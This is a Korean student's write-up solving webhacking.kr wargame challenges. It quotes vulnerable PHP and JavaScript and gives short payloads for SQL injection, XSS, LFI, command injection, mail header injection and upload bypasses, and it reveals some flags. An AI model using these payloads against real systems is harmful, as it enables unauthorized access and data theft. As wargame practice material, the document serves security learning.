# BOB 7기 취약점분석 이주창 
## webhacking.kr All clear & write-up
![auth](./img/break.png)

## Writeup

### prob1
```php
$password="????";

if(eregi("[^0-9,.]",$_COOKIE[user_lv])) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>=6) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>5) @solve();

echo("<br>level : $_COOKIE[user_lv]");
```
다음 조건과 맞게 cookie를 바꿔주면 된다. 5.5로 해주면 될듯 하다.

![prob1](./img/prob1.png)

### prob2
```
bbs 페이지의 테이블명 : FreeB0aRd

admin 페이지의 테이블명 : admin
```
예전에 힌트로 주어졌다고 하는 모양이다. ( 정 알 방법이 없는거같아서 write-up을 봤다 )

이 문제에서는 time이라는 cookie가 있는데, 여기서 true/false에 따라서 주석에 있는 시간이 바뀐다. 따라서 blind sqli가 가능하다.

__Exploit__ : [prob2.py](./exploit/prob2.py)

![prob2](./img/prob2-1.png)

![prob2](./img/prob2-2.png)

admin거 한글자정도는 게싱해보자.

zip 비밀번호 : @dM1n__nnanual 

![prob2](./img/prob2.png)

### prob3

처음에 퍼즐이 있는데, 옛날에 많이 풀어본 모양이다. 금방 풀어주자

![prob3](./img/prob3-1.png)

이를 풀면, 간단한 submit창이 나오는데, 여기서 hidden input에 간단한 테스트를 해보면 query error라는 문자열이 뜨는걸 보고, SQLi를 알 수 있다. 필터링을 적당히 우회하면 된다.

__Exploit__: ~~~~ || 1

![prob3](./img/prob3-2.png)

### prob4

base64 => sha1 => sha1 이다.

```
YzQwMzNiZmY5NGI1NjdhMTkwZTMzZmFhNTUxZjQxMWNhZWY0NDRmMg  
=> c4033bff94b567a190e33faa551f411caef444f2	
=> a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 
=> test
```

https://hashkiller.co.uk/sha1-decrypter.aspx

![prob4](./img/prob4.png)



### prob5

join은 클릭이 안되고, login을 클릭하고 login.php를 지워보니

http://webhacking.kr/challenge/web/web-05/mem/

에서 Directory listing이 된다. 여기서 join.php에 들어가서 소스를 보면

```javascript
l='a';ll='b';lll='c';llll='d';lllll='e';llllll='f';lllllll='g';llllllll='h';lllllllll='i';llllllllll='j';lllllllllll='k';llllllllllll='l';lllllllllllll='m';llllllllllllll='n';lllllllllllllll='o';llllllllllllllll='p';lllllllllllllllll='q';llllllllllllllllll='r';lllllllllllllllllll='s';llllllllllllllllllll='t';lllllllllllllllllllll='u';llllllllllllllllllllll='v';lllllllllllllllllllllll='w';llllllllllllllllllllllll='x';lllllllllllllllllllllllll='y';llllllllllllllllllllllllll='z';I='1';II='2';III='3';IIII='4';IIIII='5';IIIIII='6';IIIIIII='7';IIIIIIII='8';IIIIIIIII='9';IIIIIIIIII='0';li='.';ii='<';iii='>';lIllIllIllIllIllIllIllIllIllIl=lllllllllllllll+llllllllllll+llll+llllllllllllllllllllllllll+lllllllllllllll+lllllllllllll+ll+lllllllll+lllll;
lIIIIIIIIIIIIIIIIIIl=llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+lll+lllllllllllllll+lllllllllllllll+lllllllllll+lllllllll+lllll;if(eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl)==-1) { bye; }if(eval(llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+'U'+'R'+'L').indexOf(lllllllllllll+lllllllllllllll+llll+lllll+'='+I)==-1){alert('access_denied');history.go(-1);}else{document.write('<font size=2 color=white>Join</font><p>');document.write('.<p>.<p>.<p>.<p>.<p>');document.write('<form method=post action='+llllllllll+lllllllllllllll+lllllllll+llllllllllllll+li+llllllllllllllll+llllllll+llllllllllllllll
+'>');document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name='+lllllllll+llll+' maxlength=5></td></tr>');document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name='+llllllllllllllll+lllllllllllllllllllllll+' maxlength=10></td></tr>');document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');}
```

가 나오는데, else{~~~} 부분에 document.write가 있는걸로 보아, 뭔가를 만들어 줄거 같아서 console에서 실행시켜 보니 join form이 나왔다. 그래서 대충 가입하고 로그인 해보니 not admin을 띄운다. admin으로 가입하는게 문제인가 해서 해봤는데, 이미 있는 계정이란다.

그래서 생각한것이 sql truncation attack이다.

__Exploit__ : admin                                              '

![prob5](./img/prob5.png)

### prob6

단순히 admin을 base64 20번 해주면 된다.

![prob6](./img/prob6.png)

### prob7
문제 깨졌습니다..

### prob8

select query에는 $_SERVER[HTTP_USER_AGENT]를 사용하고 insert부분에서는 파싱된 $agent를 사용하는데, 이때 insert based SQLi가 가능하다. 이를 통해서 admin을 따면 된다.

__Core Exploit__ : c2w2m2', '1', 'admin'), ('2

__Exploit__ : [prob8.py](./exploit/prob8.py)

![prob8](./img/prob8.png)

### prob9
no에서 if를 응용한 blind SQLi가 가능하다. =, 띄어쓰기가 막혔음으로, substr과 strcmp를 이용하여 id를 가져오면 된다.

__Core Exploit__ : if(strcmp(0x62,0x61),3,0)

__Exploit__ : [prob9.py](./exploit/prob9.py)

![prob9](./img/prob9.png)

### prob10
javascript를 보면 hackme의 posLeft가 800이되면 플래그가 나올거 같다.

__Exploit__ 
```javascript
hackme.style.posLeft=800; if(hackme.style.posLeft==800)hackme.href='?go='+hackme.style.posLeft
```
![prob10](./img/prob10.png)

### prob11
```
$pat="/[1-3][a-f]{5}_.*218.146.20.61.*\tp\ta\ts\ts/";
```
다음같은 정규식을 만족하면 flag를 준다.

__Exploit__ : 2abbbb_0218.146.20.610%09p%09a%09s%09s

![prob11](./img/prob11.png)

### prob12

javascript challenge라고 한다. 코드를 열어보면

```javascript
WorkTimeFun = String.fromCharCode(118, 97, ..., 13, 10);
eval(WorkTimeFun);
```

이라는 코드가 있는데, eval로 실행시키는걸로 보아 WorkTimeFun이 그냥 코드같다.

그래서 이걸 보면

```javascript
var enco='';
var enco2=126;
var enco3=33;
var ck=document.URL.substr(document.URL.indexOf('='));
 
 
for(i=1;i<122;i++)
{
enco=enco+String.fromCharCode(i,0);
}
 
function enco_(x)
{
return enco.charCodeAt(x);
}
 
if(ck=="="+String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+String.fromCharCode(enco_(232))+String.fromCharCode(enco_(192))+String.fromCharCode(enco_(226))+String.fromCharCode(enco_(200))+String.fromCharCode(enco_(204))+String.fromCharCode(enco_(222-2))+String.fromCharCode(enco_(198))+"~~~~~~"+String.fromCharCode(enco2)+String.fromCharCode(enco3))
{
alert("Password is "+ck.replace("=",""));
}
```

이걸 보면 마지막에 ch == "=" + String.fromCharCode(enco_(240)) ~~~ 를 if문으로 체크하는데, 이게 flag일거 같다.

그래서 실제로 보니까

![prob11](./img/prob12.png)

여기서 =을 replace한 값이 플래그다.

### prob13

no에서 blind SQLi가 가능하다. space는 %0a로 우회하면된다. substr과 in을 사용해서 blind SQLi를 하면 된다.

__Core Exploit__ : (substr((select min(flag) from prob13password ), 1,1 )in(0x41))

__Exploit__ : [prob13.py](./exploit/prob13.py)

![prob13](./img/prob13.png)

마지막 한글자가 짤렸는데, r이다.

### prob14

javascript challenge다.

```javascript
function ck()
{
var ul=document.URL;
ul=ul.indexOf(".kr");
ul=ul*30;
if(ul==pw.input_pwd.value) { alert("Password is "+ul*pw.input_pwd.value); }
else { alert("Wrong"); }
}
```

ul값이 pw다. 실행시켜보면 510이 나온다. 

![prob14](./img/prob14.png)



### prob15

들어가면 바로 Access_Denied 띄우는데, 소스보기 누르면 

```javascript
alert("Access_Denied");
history.go(-1);
document.write("password is off_script");
```



### prob16

```javascript
function mv(cd)
{
kk(star.style.posLeft-50,star.style.posTop-50);
if(cd==100) star.style.posLeft=star.style.posLeft+50;
if(cd==97) star.style.posLeft=star.style.posLeft-50;
if(cd==119) star.style.posTop=star.style.posTop-50;
if(cd==115) star.style.posTop=star.style.posTop+50;
if(cd==124) location.href=String.fromCharCode(cd);
}
```

location.href = String.fromCharCode(cd); 를 실행시키는데, cd==124일때 하니까, 그걸 넣어서 해주면 된다.

![prob16](./img/prob16.png)

### prob17

```javascript
unlock=100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10-100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+9999999999;
```

계산하면된다.

![prob17](./img/prob17.png)

### prob18

```php
if($_GET[no]) 
{ 

if(eregi(" |/|\(|\)|\t|\||&|union|select|from|0x",$_GET[no])) exit("no hack"); 

$q=@mysql_fetch_array(mysql_query("select id from challenge18_table where id='guest' and no=$_GET[no]")); 

if($q[0]=="guest") echo ("hi guest"); 
if($q[0]=="admin") 
{ 
@solve(); 
echo ("hi admin!"); 
} 

} 
```

띄어쓰기는 %0a로 우회하고, or를 이용해서 조건을 true로 만들고, limit으로 값을 줄여서 꺼내면 될 거같다.

__Exploit__ : 1%0aor%0a1=1%0alimit%0a1,1

![prob18](./img/prob18.png)

### prob19
문제 깨졌습니다..

### prob20

모든 인풋을 값을 맞춰서 2초안에 넣으면 된다.

```javascript
lv5frm.id.value="c2w2m2";
lv5frm.cmt.value="hello";
lv5frm.hack.value=lv5frm.attackme.value;
ck()
```

다음같은 간단한 js를 짜고, 콘솔에다가 2초안에 복사 붙여넣기 하면 풀린다.

![prob20](./img/prob20.png)

### prob21

문제에서 준 그대로 blind SQLi하면 된다.

__Core Exploit__ : ascii(substr(pw, 1,1))=97

__Exploit__ : [prob21.py](./exploit/prob21.py)

 ![prob21](./img/prob21.png)

### prob22

Wrong과 Wrong password로 Blind SQLi가 가능하다.

__Core Exploit__ :  admin' and ascii(substr(pw, 1, 1)) = 41# 

__Exploit__ : [prob22.py](./exploit/prob22.py)

![prob22](./img/prob22.png)

돌리면 2a93a7cea083c6e9e02c97ec5a5d715a 의 md5 hash값이 나온다. 이를 https://www.md5online.org/md5-decrypt.html 에서 decrypt하면 **rainbowzombie** 가 나온다.

근데 여기서 뭘 해도 인증이 안되길래 writeup을 봤는데 test/1234로 로그인해서 salt를 알아내야 한다고 한다...

### prob23

%00넣으면 이후는 검사 안한다.

__Exploit__ : %00<script>alert(1);</script>

![prob23](./img/prob23.png)

### prob24

```php
if($_COOKIE[REMOTE_ADDR])
{
$ip=str_replace("12","",$ip);
$ip=str_replace("7.","",$ip);
$ip=str_replace("0.","",$ip);
}
```

다음과 같이 replace 하는데 1122 같은 식으로 보내주게 되면, 1__12__2 가 지워짐으로 결과적으로 12 가 남게 된다.

__Exploit__ : 112277..00..00..1

쿠키에 REMOTE_ADDR 이름으로 Exploit 값을 넣어주면 된다.

![prob24](./img/prob24.png)

### prob25

간단한 lfi 취약점이다. 끝에 확장자를 추가로 붙이는거 같은데 %00으로 우회하면 된다.

__Exploit__ : password.php%00

![prob25](./img/prob25.png)

### prob26

```php
if(eregi("admin",$_GET[id])) { echo("<p>no!"); exit(); } 

$_GET[id]=urldecode($_GET[id]); 

if($_GET[id]=="admin") 
{ 
@solve(26,100); 
} 
```

url encoding을 2번해주게 되면 우회할 수 있다.

__Exploit__ : %2561dmin

![prob26](./img/prob26.png)

### prob27

```php
if(eregi("#|union|from|challenge|select|\(|\t|/|limit|=|0x",$_GET[no])) exit("no hack");

$q=@mysql_fetch_array(mysql_query("select id from challenge27_table where id='guest' and no=($_GET[no])")) or die("query error");

if($q[id]=="guest") echo("guest");
if($q[id]=="admin") @solve();

```

간단한 SQLi다. = 은 like로 우회해주고, 처음 조건을 false로 맞추고 뒤 조건을 no like 2 로 해주면 admin이 꺼내져 온다.

__Exploit__ : 0)||no%20like%202--%20-

![prob27](./img/prob27.png)

### prob28
문제 깨졌습니다..

### prob29

문제에 blind sql injection이라고 써있는거 보니 SQLi 문제인거 같다. 근데 file upload로 하는걸로 보아 이름에다가 query를 넣어야 할 거 같다. 그리고 업로드 인걸로 보아 아마 insert baed SQLi일거 같다.

![prob29-1](./img/prob29-1.png)

파일을 업로드하면 다음과 같은 표를 띄워준다. 대충 칼럼은 3개쯤 된다고 게싱이 가능하다.

이제 뭐가 어떤 칼럼인지 알아봐야 되는데

asdf'),('qwer','qwer','qwer')#

같은 쿼리를 보내면, 에러없이 제대로 올라가지만, 화면에 표시가 되지 않는다. 이를 통해 ip가 같아야지 올라온다는 것을 알 수 있다. 그래서, 그걸 기반으로 하나 하나 옮기면서 넣어보니까 3번째가 ip였다. 이제 힌트로 준 sub query를 이용해서 따면 된다.

__Exploit__ : aaa', (select password from c29_tb), char(50,49,56,46,49,52,54,46,50,48,46,54,49))#

![prob29.png](./img/prob29.png)

### prob30
문제 깨졌습니다..

### prob31

```php
$port=rand(10000,10100);
$socket=fsockopen("$_GET[server]","$port",$errno,$errstr,3) or die("error : $errstr");
```

server에 내서버 ip 넣어두고, 포트를 열어서 연결이 되면 뭐가 오는지를 일단 봐야할거 같다.

넣어두고 계속해서 F5를 누르다 보면

![prob31](./img/prob31.png)

바로 패스워드를 준다.

### prob32

cookie에 vote_check가 ok가 되면 투표를 못한다.

![prob32-1](./img/prob32-1.png)

다음과 같은 간단한 코드로 1등을 먹을 수 있는데, 해보니까 1등이 문제가 아니라, 100개를 채워야 하는 모양이다. 그래서 18개를 더 하고, 수동으로 1개 하니까 클리어 됐 	다.

![prob32](./img/prob32.png)

### prob33

모든 조건을 맞춰서 통과해 주면 된다. 총 10스테이지가 있고, 다시풀기에는 좀 많이 귀찮았다...

![prob33](./img/prob33.png)

### prob34

들어가면 바로 Wrong을 띄운다. 원래는 javascript obfuscation break 문제인거 같은데, 개발자 도구에서 바로 해석된 javascript를 볼 수 있다.

![prob34-1](./img/prob34-1.png)



![prob34](./img/prob34.png)

### prob35

간단한 insert based sqli다.

```php
if(eregi("%|\*|/|=|from|select|x|-|#|\(\(",$_GET[phone])) exit("no hack");

@mysql_query("insert into challenge35_list(id,ip,phone) values('$_SESSION[id]','$_SERVER[REMOTE_ADDR]',$_GET[phone])") or die("query error");
echo("Done<br>");

$admin_ck=mysql_fetch_array(mysql_query("select ip from challenge35_list where id='admin' and ip='$_SERVER[REMOTE_ADDR]'"));

if($admin_ck[ip]==$_SERVER[REMOTE_ADDR])
{
@solve();
@mysql_query("delete from challenge35_list");
}
```

임으로, concat과 char을 통해서admin, ip주소를 만들어 주면 된다. 혹은 char만 써도 된다..

__Exploit__ :  010), (concat(char(97),char(100),char(109),char(105),char(110)), concat(char(50),char(49),char(56),char(46),char(49),char(52),char(54),char(46),char(50),char(48),char(46),char(54),char(49)),01064781234

근데 이상하게 2018-07-07기준으로 풀렸던 문제가 2018-07-08기준 방화벽 문제로 풀리지 않는다.

![prob35](./img/prob35.png)

### prob36
문제 깨졌습니다..

### prob37
문제 깨졌습니다..

### prob38

log injection을 진행해 주면 된다.

__Exploit__ : 121.170.91.194:admin

![prob38](./img/prob38.png)

### prob39

```php
$_POST[id]=str_replace("\\","",$_POST[id]);
$_POST[id]=str_replace("'","''",$_POST[id]);
$_POST[id]=substr($_POST[id],0,15);
$q=mysql_fetch_array(mysql_query("select 'good' from zmail_member where id='$_POST[id]"));

if($q[0]=="good") @solve();
```

' => ''가 되지만, substr에 의해서 짤려서 길이를 맞춰주면, 마지막 한개가 ' 가 되어 쿼리문에 에러가 나지 않는다.

__Exploit__ : admin         '

![prob39](./img/prob39.png)

### prob40

no를 기준으로 간단한 blind sqli를 해주면 된다

__Core Exploit__ : 0||2%26%26substr(pw,1,1)= 0x41

__Exploit__ : [prob40.py](./exploit/prob40.py)



### prob41

```php
$fn=str_replace("<","",$fn);
$fn=str_replace(">","",$fn);
$cp=$_FILES[up][tmp_name];

copy($cp,"$hidden_dir/$fn");
```

여기서 파일명을 없는걸로 만들수 있고, 그러면 copy에서 에러가 뜨게 된다.

```
Warning: copy(dkanehdkftndjqtsmsdlfmadmlvhfejzzzzzzzzzkkkkkkkkggggggggg/) [function.copy]
```

그리고 멀쩡한 파일 하나 올리고, 들어가서 읽으면 된다.

__Flag__ : ba1403f3bb9108989b29a01cf3ba4c06

### prob42
간단한 File download 취약점이다.

```
http://webhacking.kr/challenge/web/web-20/?down=dGVzdC56aXA=
```

받아서, AZPR로 풀어주면 된다. 852가 나온다.

```
http://webhacking.kr/challenge/web/web-20/good.html
```



### prob43

content-type을 고쳐서 php를 업로드 시키면 된다. image/jpeg로 고치면 된다.

![prob43](./img/prob43.png)

### prob44

단순한 입력제한 5글자 걸린 인풋칸 밖에 주어지지 않는다. SQLi는 아닌거 같아서, 커맨드 인젝션을 시도해 봤다.

일단 ls를 넣으면 아무것도 오지 않는걸로 보아, 필터링 된것 같다. ; 또한 마찬가지 였다.

따라 ls 와 & 를 이용해서 command injection을 해야 할 거 같은데, 

리눅스에서 'l's == ls 인걸 이용해서

__Exploit__ : '&l's

다음을 사용할 수 있다. 다음을 실행하면 challenge44_PaSs_w0Rd___.php라는 파일이 있는데, 들어가보면 문제가 풀린다.

![prob44](./img/prob44.png)

추가적으로 이걸로 id같은거 쳐보려 했는데 '&i'd는 먹히지 않는걸로 보아 하드코딩인거 같다..

### prob45

주어지는 코드를 보면

```PHP
$_GET[id]=mb_convert_encoding($_GET[id],'utf-8','euc-kr');

$data=@mysql_fetch_array(mysql_query("select id from members where id='$_GET[id]' and pw=md5('$_GET[pw]')"));

if(eregi("admin",$_GET[id])) exit();
if(eregi("from",$_GET[id])) exit();
if(eregi("union",$_GET[id])) exit();
if(eregi("limit",$_GET[id])) exit();
if(eregi("union",$_GET[pw])) exit();
if(eregi("pw",$_GET[pw])) exit();
if(eregi("=",$_GET[pw])) exit();
if(eregi(">",$_GET[pw])) exit();
if(eregi("<",$_GET[pw])) exit();
if(eregi("from",$_GET[pw])) exit();


if($data)
{
echo("hi $data[0]<br><br>");

if($data[0]=="admin") @solve();
}
```

mb_convert_encoding함수로 euc-kr을 utf-8로 바꾸는데, 이때 멀티바이트로 인해서 magic_quotes_gpc를 bypass할 수 있다.

이를 이용해서 sqli를 진행해 주면 된다.

__Exploit__: %a1%27 or id like concat(char(97),char(100),char(109),char(105),char(110))-- -

![prob45](./img/prob45.png)

### prob46

```php
$_GET[lv]=str_replace(" ","",$_GET[lv]);
$_GET[lv]=str_replace("/","",$_GET[lv]);
$_GET[lv]=str_replace("*","",$_GET[lv]);
$_GET[lv]=str_replace("%","",$_GET[lv]);

if(eregi("union",$_GET[lv])) exit();
if(eregi("select",$_GET[lv])) exit();
if(eregi("from",$_GET[lv])) exit();
if(eregi("challenge",$_GET[lv])) exit();
if(eregi("0x",$_GET[lv])) exit();
if(eregi("limit",$_GET[lv])) exit();
if(eregi("cash",$_GET[lv])) exit();

$q=@mysql_fetch_array(mysql_query("select id,cash from members where lv=$_GET[lv]"));

if($q && $_GET[lv])
{
echo("$q[0] information<br><br>money : $q[1]");

if($q[0]=="admin") @solve();

}
```

필터링 우회해서 id="admin"만들어 주면 된다.

__Exploit__ : 0||id=concat(char(97),char(100),char(109),char(105),char(110))

![prob46](./img/prob46.png)

### prob47

Mail header injection은 주로 개행을 삽입하고, 추가적인 헤더를 붙여서 Mail을 leaking하는 것이다.

이문제는 그냥 Proxy로 잡아서 밑에 cc: ~~~ 적어주면 된다

__Exploit__: cc: ~~~

005eefe6b143db0f7d69b196df100043

![prob47](./img/prob47.png)

### prob48

파일명에서 command injection이 터진다.

;ls해서 읽고 끝내면 된다.

![prob48](./img/prob48.png)

### prob49

```php
if(time()<1258110000) exit();

if($_GET[lv])
{
if(eregi("union",$_GET[lv])) exit();
if(eregi("from",$_GET[lv])) exit();
if(eregi("select",$_GET[lv])) exit();
if(eregi("or",$_GET[lv])) exit();
if(eregi("and",$_GET[lv])) exit();
if(eregi("\(",$_GET[lv])) exit();
if(eregi("\)",$_GET[lv])) exit();
if(eregi("limit",$_GET[lv])) exit();
if(eregi(",",$_GET[lv])) exit();
if(eregi("/",$_GET[lv])) exit();
if(eregi("by",$_GET[lv])) exit();
if(eregi("desc",$_GET[lv])) exit();
if(eregi("asc",$_GET[lv])) exit();
if(eregi("cash",$_GET[lv])) exit();
if(eregi(" ",$_GET[lv])) exit();
if(eregi("%09",$_GET[lv])) exit();

$q=@mysql_fetch_array(mysql_query("select id from members where lv=$_GET[lv]"));

echo($q[0]);
if($q[0]=="admin") @solve();

}
```

prob46에 비해서 필터링이 조금 빡세졌지만, hex로 encode하면 간단하게 풀 수 있다.

__Exploit__ : 0||id=0x61646D696E

![prob49](./img/prob49.png)

### prob50
문제 깨졌습니다..

### prob51

```php
if($_POST[id] && $_POST[pw])
{
$input_id=$_POST[id];
$input_pw=md5($_POST[pw],true);

$q=@mysql_fetch_array(mysql_query("select id from challenge_51_admin where id='$input_id' and pw='$input_pw'"));

if($q[id]=="admin")
{
@solve(51,250);
}

if($q[id]!="admin") echo("<center><font color=green><h1>Wrong</h1></font></center>");


}
```

php에서 md5할때 true로 주면 '!@#$같은 문자열이 포함이 가능하다. 그래서 ' or ' 이 나오는 해시값 찾아주면 된다.

__Exploit__: 129581926211651571912466741651878684928

![prob51](./img/prob51.png)

### prob52

개행을 이용하여 Injection 해주면 된다.

__Exploit__: c2w2m2%0A%0Dclear:+c2w2m2

![prob52](./img/prob52.png)

### prob53

procedure analyse()를 통해서 table이름을 가져오면 된다.

__Exploit__ : 1 procedure analyse() 

![prob53](./img/prob53.png)

### prob54

password를 XMLHttpRequest를 통해서 가져온다.

```javascript
function run(){
  if(window.ActiveXObject){
   try {
    return new ActiveXObject('Msxml2.XMLHTTP');
   } catch (e) {
    try {
     return new ActiveXObject('Microsoft.XMLHTTP');
    } catch (e) {
     return null;
    }
   }
  }else if(window.XMLHttpRequest){
   return new XMLHttpRequest();
 
  }else{
   return null;
  }
 }
 
x = run()

function good(i){
    x.open('GET','?m='+i,false);
    x.send(null);
    return x.responseText;
}
res = '';
for(i=0; i<100; i++){
    res += good(i);
    console.log(res);
}
```

따라서 다음같은 코드를 짜서 돌리면 나오게 된다.

![prob54](./img/prob54.png)

### prob55

먼저 rank.php에서 score가 get 파라메터로 주어진다. 그리고 source를 보면

```
hint

rank table
====================
ip ( = id )
score
**password** --> small letter
====================
```

다음같은 힌트가 있다. 그리고 한번 procedure analyse()를 통해서 봤는데, ip이름이 찍혀 나왔다.

그래서 처음에는 password가 그대로 column이름인줄 알고 해봤는데 아무것도 되지 않았다. 그래서 한번 limit를 걸고 procedure analyse()를 해보았다.

__Exploit1__ : 2147483647%20limit%202,1%20procedure%20analyse()

그랬더니 pAsSw0RdzzzZ  라는 column 이름이 나왔다. 그리고 score가 1이때나 0일때 나오는 출력이 달라짐을 이용해서 if를 걸고, Blind SQLi해주면 된다. 그리고 substr이 막혔는데, right left로 우회해 주면 된다

__Core Exploit__: if(right(left(pAsSw0RdzzzZ ,1),1)=0x61, 1, 0)

__Exploit__ : [prob55.py](./exploit/prob55.py)

![prob55](./img/prob55.png)

### prob56

_ whildcard가 먹힌다. whildcard를 통해 진행해주면 된다.

[prob56.py](./exploit/prob56.py)

![prob56](./img/prob56.png)

여기서 살짝의 게싱을 더해서 kk%php == kk.php 라고 해보면

![prob56](./img/prob56-2.png)

### prob57

문제 깨졌습니다..

### prob58

swf파일이 있는데, 이를 다운받고 JPEXS로 decompile 해주면

```
on(press){
   if(pw == "10;(_")
   {
      getUrl("http://webhacking.kr/challenge/web/web-35/g1v2m2passw0rd.php", "_self");
   }
   else
   {
      pw = "Wrong";
   }
}
```

다음 코드가 나온다.

![prob58](./img/prob58.png)

### prob59

```php
if($_POST[lid] && $_POST[lphone])
{
$q=@mysql_fetch_array(mysql_query("select id,lv from c59 where id='$_POST[lid]' and phone='$_POST[lphone]'"));

if($q[id])
{

echo("id : $q[id]<br>lv : $q[lv]<br><br>");

if($q[lv]=="admin")
{
@mysql_query("delete from c59");
@clear();
}

echo("<br><a href=index.php>back</a>");
exit();
}

}


if($_POST[id] && $_POST[phone])
{
if(strlen($_POST[phone])>=20) exit("Access Denied");
if(eregi("admin",$_POST[id])) exit("Access Denied");
if(eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])) exit("Access Denied");

@mysql_query("insert into c59 values('$_POST[id]',$_POST[phone],'guest')");
}
```

필터링을 우회해서 insert based SQLi를 진행해서 권한을 admin으로 만들어야한다. 

reverse함수를 이용해서 id를 nimda로 주고, 

__Exploit__: 32,reverse(id))-- 

를 진행해주고, 로그인하면 된다. 주의할점은 -- 다음에 띄어쓰기 하나가 꼭 있어야한다.

![prob59](./img/prob59.png)

### prob60

```php
sleep(1);

if(eregi("[0-9]",$_COOKIE[PHPSESSID])) exit("Access Denied<br><a href=index.phps>index.phps</a>");

if($_GET[mode]=="auth")
{
echo("Auth~<br>");
    $f=@file("readme/$_SESSION[id].txt");
    for($i=0;$i<=strlen($f);$i++)
        {
        $result.=$f[$i];
        }
    if(eregi("$_SESSION[id]",$result))
    {
    echo("Done!");
    @unlink("readme/$_SESSION[id].txt");
    @clear();
    exit();
    }
}


$f=@fopen("readme/$_SESSION[id].txt","w");
@fwrite($f,"$_SESSION[id]");
@fclose($f);

if($_SERVER[REMOTE_ADDR]!="127.0.0.1")
{
sleep(1);
@unlink("readme/$_SESSION[id].txt");
```

간단한 race condition문제이다. PHPSESSID는 각각 "A"*32, "B"*32로 만들고 재 로그인한 다음, 한쪽에서는 index.php를, 한쪽에서는 index.php?mode=auth를 반복해서 접속하게 해주면, clear가 되게 된다.

### prob61

```php
echo("<a href=index_lolll.phps>source</a>");

if(!$_GET[id]) $_GET[id]="guest";

echo("<html><head><title>Challenge 61</title></head><body>");

if(eregi("\(|\)|union|select|challenge|from|,|by|\.",$_GET[id])) exit("Access Denied");
if(strlen($_GET[id])>18) exit("Access Denied");

$q=@mysql_fetch_array(mysql_query("select $_GET[id] from c_61 order by id desc limit 1"));

echo("<b>$q[id]</b><br>");

if($q[id]=="admin") @clear();

echo("</body></html>");
```

단순한 트릭이다. 

__Exploit__ :  0x61646D696E id

![prob61](./img/prob61.png)